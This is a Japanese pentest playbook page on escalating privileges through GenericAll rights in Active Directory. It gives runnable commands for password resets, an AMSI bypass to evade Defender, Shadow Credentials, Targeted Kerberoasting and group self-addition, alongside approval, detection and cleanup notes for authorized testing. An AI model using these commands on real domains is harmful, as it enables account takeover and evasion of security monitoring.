# GenericAll の悪用

> **スコープ**: BloodHound で `GenericAll` エッジ確認後、対象オブジェクト（ユーザー / グループ / コンピューター）に対する完全制御権限を悪用して権限昇格する。パスワードリセット〜グループ追加〜Shadow Credentials〜Targeted Kerberoasting〜RBCD（コンピューター）まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（実ユーザーのパスワードリセットは業務停止に直結）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（パスワードリセット・グループメンバー追加・SPN 付与）
> - [x] SIEM/EDR で確実に検知される（Event ID 4724 / 4728 / 4732 / 4738）
>
> 実施可否は事前合意で明示確認すること。原状回復（パスワード復元・グループ削除）必須。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericAll--> [ターゲットオブジェクト]` が確認できた場合。

## 環境前提
- 実行環境: テスター端末（Linux 側）または Windows シェル（PowerView）
- 必要なツール: `net rpc`（標準搭載）/ `PowerView.ps1`（Windows シェル取得済みの場合。別途取得要）/ `certipy`（Shadow Credentials。標準搭載または pip）/ `targetedKerberoast.py`（別途 GitHub 取得要）

## 先に確認すること

- **GenericAll を持っているのが「ユーザー自身」なのか「所属グループ経由」なのかを確認する**（BloodHound は両方表示する）
- **ターゲットオブジェクトの種別**（ユーザー / グループ / コンピューター）で悪用手法が分岐する

**攻撃者の思考トレース:** GenericAll は完全制御のため悪用手法の選択肢が多い。ユーザーに対しては「パスワードリセット → PSSession」、グループに対しては「自分を追加 → そのグループの権限を行使」、コンピューターに対しては「RBCD 攻撃」が基本。BloodHound で矢印の向きを確認する（矢印の出発点が操作する側）。

---

## 1. ユーザーオブジェクトへの GenericAll — パスワードリセット

**コマンド（Linux 側 / net rpc）:**

```bash
# [Attacker] Linux 側から実行
net rpc password [TARGET_USER] '[NEW_PASSWORD]' -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]
```

**コマンド（Windows シェル内 / PowerView）:**

事前準備（必須）: PowerView.ps1 をターゲットに転送する。

```bash
# [Attacker] テスター端末から転送
scp PowerView.ps1 [USER]@[IP]:/temp/
```

```powershell
# [Target] AMSI バイパスを先に実行（検知回避）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

powershell -ep bypass
Import-Module C:\temp\PowerView.ps1

# [Target] GenericAll を持つユーザーの認証情報オブジェクトを作成
$SecurePassword = ConvertTo-SecureString '[CURRENT_USER_PASSWORD]' -AsPlaintext -Force
$Creds = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[CURRENT_USER]', $SecurePassword)

# [Target] ターゲットユーザーのパスワードをリセット
$UserPass = ConvertTo-SecureString '[NEW_PASSWORD]' -AsPlaintext -Force
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword $UserPass -Credential $Creds

# [Target] パスワードリセットしたユーザーで PSSession を作成して横断移動
$pass = ConvertTo-SecureString -AsPlainText -Force '[NEW_PASSWORD]'
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
Enter-PSSession -Session $session
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| PSSession で `whoami` が `[DOMAIN]\[TARGET_USER]` | 横断移動成功 | BloodHound でそのユーザーの次のエッジを確認 |
| `Set-DomainUserPassword` がエラー | AMSI が検知 | AMSI バイパスを先に実行 |

**注意（原状回復）:** パスワードリセット後は元のパスワードに戻す（不可なら対象組織側でリセット運用）。

---

## 2. ユーザーオブジェクトへの GenericAll — Shadow Credentials

**コマンド:**

```bash
# [Attacker] Shadow Credentials（証明書ベースの認証）
certipy shadow auto -u '[USER]@[DOMAIN]' -p '[PASSWORD]' -account '[TARGET_USER]' -dc-ip [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| PFX ファイルと NT ハッシュが出力される | Shadow Credentials 成功 | NT ハッシュで Pass-the-Hash / 横断移動 |

**注意（原状回復）:** 追加した `msDS-KeyCredentialLink` 値を削除する（`certipy shadow remove`）。

---

## 3. ユーザーオブジェクトへの GenericAll — Targeted Kerberoasting

**コマンド:**

```bash
# [Attacker] GenericAll は GenericWrite を包含するため SPN の設定が可能
python3 targetedKerberoast.py -v -d '[DOMAIN]' -u '[USER]' -p '[PASSWORD]' --dc-ip [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ハッシュが出力される | Targeted Kerberoasting 成功 | hashcat でクラック → `../Kerberos_Attacks/Kerberoasting.md` |

---

## 4. グループオブジェクトへの GenericAll — グループへの自分の追加

**コマンド:**

```bash
# [Attacker] Linux 側から
net rpc group addmem '[GROUP_NAME]' '[CURRENT_USER]' \
  -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]
```

```powershell
# [Target] PowerShell
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| グループ追加成功 | 該当グループの権限を行使できる | 次のエッジを BloodHound で確認。LAPS グループなら `../LAPS_Dump.md` へ |

**注意（原状回復）:** 追加したグループメンバーシップを削除する（`net rpc group delmem` / `Remove-ADGroupMember`）。

---

## 5. コンピューターオブジェクトへの GenericAll — RBCD

対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性を変更して RBCD を設定できる。

**詳細 → `../Delegation_Attacks/RBCD.md`**

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| PowerView が AMSI に検知される | Defender がアクティブ | AMSI バイパスを先に実行 |
| 権限があるはずなのに拒否される | 所属グループ経由の GenericAll の場合、グループメンバーシップの反映に時間がかかる | 新しい PSSession を開いてから再試行 |

---

## 注意点・落とし穴

- GenericAll を持っているのが「ユーザー自身」なのか「所属グループ経由」なのかを確認する（BloodHound は両方表示する）
- パスワードリセット後は元のパスワードに戻すか、ターゲットのパスワード変更が検知される可能性を考慮する
- Shadow Credentials は ADCS（Active Directory Certificate Services）環境が必要な場合がある

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。実ユーザーのパスワードリセットは業務停止に直結するため、対象ユーザーごとに個別承認が必要
- **想定されるSIEM/EDR検知**: Event ID 4724（パスワードリセット）/ 4728・4732（グループメンバー追加）/ 4738（ユーザー属性変更・SPN 追加等）/ 4769（Targeted Kerberoasting で SPN 追加後の TGS 要求）
- **業務影響リスク**: サービス停止（パスワードリセット対象ユーザーは即座に業務不可）/ グループ権限変更による業務上の権限拡張
- **原状回復必須項目**: ✅ パスワードリセットしたユーザーを元に戻す / ✅ 追加したグループメンバーシップの削除 / ✅ Targeted Kerberoasting で付与した SPN の削除 / ✅ Shadow Credentials で追加した `msDS-KeyCredentialLink` 値の削除 / ✅ 取得した TGT / NTLM ハッシュの暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：BloodHound で GenericAll 権限を発見後 → `../../05_Tools_Reference/BloodHound.md`
- 関連：コンピューターオブジェクトへの GenericAll → RBCD → `../Delegation_Attacks/RBCD.md`
- 関連：Targeted Kerberoasting → `../Kerberos_Attacks/Kerberoasting.md`
- 関連：GenericAll より限定的な権限との比較 → `GenericWrite.md`
